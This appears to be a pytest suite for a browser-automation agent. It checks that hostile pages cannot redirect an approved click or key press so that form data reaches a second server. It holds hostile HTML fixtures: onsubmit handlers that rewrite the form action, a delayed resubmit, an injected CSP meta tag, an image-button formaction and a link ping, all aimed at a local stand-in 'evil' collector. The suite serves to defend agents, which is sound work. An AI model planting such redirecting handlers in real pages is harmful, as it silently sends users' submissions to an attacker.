"""Hostile pages must not make the approved destination differ from the real one."""
from __future__ import annotations

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
import websockets

from app.agent.tests.test_browser_real_chrome import RealCDPBridge, isolated_chrome
from app.skills.browser_use.extension.toolset import BrowserTools


class _Collector(BaseHTTPRequestHandler):
    """A second origin (different port) that records what reaches it."""
    hits: list[str] = []
    def do_POST(self):
        self.rfile.read(int(self.headers.get('Content-Length', 0)))
        type(self).hits.append(self.path)
        self.send_response(204)
        self.end_headers()
    do_GET = do_POST
    def log_message(self, *args):
        pass


def _page_handler(html_for):
    class Page(BaseHTTPRequestHandler):
        def do_GET(self):
            body = html_for(self.path).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(body)
        def do_POST(self):
            self.rfile.read(int(self.headers.get('Content-Length', 0)))
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<p id=local>Local submission</p>')
        def log_message(self, *args):
            pass
    return Page


def _with_collector():
    _Collector.hits = []
    server = ThreadingHTTPServer(('127.0.0.1', 0), _Collector)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, f'http://127.0.0.1:{server.server_port}'


async def _context(socket_url, url, tool, build_args, *, visual=False):
    """Authorize one observed action and retain its independently checked outcome."""
    async with websockets.connect(socket_url, origin='http://localhost') as socket:
        bridge = RealCDPBridge(socket)
        tools = BrowserTools(bridge)
        try:
            await tools.call('navigate_page', {'pageId': 1, 'url': url, 'includeSnapshot': False})
            await tools.call('take_snapshot', {'pageId': 1})
            session = tools.pages.session(7)
            uid = lambda name: next(n.uid for n in session.nodes.values() if n.name == name)
            args = {"pageId": 1, **await build_args(bridge, uid)}
            if visual:
                screenshot = await tools.call('take_screenshot', {'pageId': 1})
                point = await bridge.evaluate("(() => {const r=document.querySelector('button').getBoundingClientRect(); return {x:r.x+r.width/2,y:r.y+r.height/2};})()")
                args.pop('uid')
                args['visual_target'] = {'screenshot_id': screenshot.structured_content['visual_binding']['screenshot_id'], **point}
            context = (await tools.call('__monaw_action_context', {'tool_name': tool, 'arguments': args})).structured_content['browser_action_context']
            output = await tools.call(tool, {**args, '__monaw_authorization': context})
            await asyncio.sleep(1.5)
            context['outcome'] = output.action_outcome
            return context
        finally:
            bridge.reader.cancel()
            await asyncio.gather(bridge.reader, return_exceptions=True)


def test_enter_submits_through_an_image_button_the_policy_must_see(tmp_path):
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'''<!doctype html><form action=/save method=post>
          <input name=q aria-label="Query"><input type=image alt="Go" formaction="{evil}/image">
          <button type=submit>Save</button></form>'''
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def focus(bridge, uid):
                await bridge.evaluate("document.querySelector('[name=q]').focus()")
                return {'key': 'Enter', 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'press_key', focus))
        actually_sent = bool(_Collector.hits)
        assert actually_sent == context['destination'].startswith(evil), (context['destination'], _Collector.hits)
        assert context['side_effect'] == 'external_mutation'
    finally:
        collector.shutdown()
        collector.server_close()


def test_link_ping_destination_is_disclosed(tmp_path):
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'<!doctype html><a href=/next ping="{evil}/ping">Next page</a>'
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def link(bridge, uid):
                return {'uid': uid('Next page'), 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'click', link))
        assert _Collector.hits == ['/ping']
        assert context['additional_destinations'] == [evil + '/ping']
        assert context['side_effect'] == 'external_mutation'
    finally:
        collector.shutdown()
        collector.server_close()


@pytest.mark.parametrize('method,handler', [
    ('post', "this.action = '{evil}/rewritten'"),
    ('get', "this.action = '{evil}/rewritten'"),
    ('post', "event.preventDefault(); setTimeout(() => {{ this.action = '{evil}/delayed'; this.submit(); }}, 350)"),
    ('post', "const m = document.createElement('meta'); m.httpEquiv = 'Content-Security-Policy'; m.content = 'form-action *'; document.head.append(m); this.target = '_blank'; this.action = '{evil}/popup'"),
])
def test_onsubmit_rewrite_after_approval_is_blocked(tmp_path, method, handler):
    """Native navigation policy survives handlers, delayed submits and new tabs."""
    collector, evil = _with_collector()
    try:
        html = lambda _path: f'''<!doctype html><form action=/save method={method}
          onsubmit="{handler.format(evil=evil)}"><input name=q aria-label="Query">
          <button type=submit>Save</button></form>'''
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def click(bridge, uid):
                return {'uid': uid('Save'), 'includeSnapshot': False}
            context = asyncio.run(_context(socket_url, url, 'click', click))
        assert _Collector.hits == [], (context['destination'], _Collector.hits)
        if 'setTimeout' not in handler:
            assert context['outcome']['verification']['type'] == 'form_destination'
            assert context['outcome']['status'] == 'failed'
    finally:
        collector.shutdown()
        collector.server_close()


@pytest.mark.parametrize('visual', [False, True])
def test_approved_form_destination_still_receives_submission(tmp_path, visual):
    """The same guard permits the reviewed cross-origin form submission."""
    collector, approved = _with_collector()
    try:
        html = lambda _path: f'''<!doctype html><form action="{approved}/approved" method=post>
          <input name=q value=test><button type=submit>Save</button></form>'''
        with isolated_chrome(tmp_path, _page_handler(html)) as (socket_url, url):
            async def click(bridge, uid):
                """Use the freshly observed button as the exact action target."""
                return {'uid': uid('Save'), 'includeSnapshot': False}
            asyncio.run(_context(socket_url, url, 'click', click, visual=visual))
        assert _Collector.hits == ['/approved']
    finally:
        collector.shutdown()
        collector.server_close()
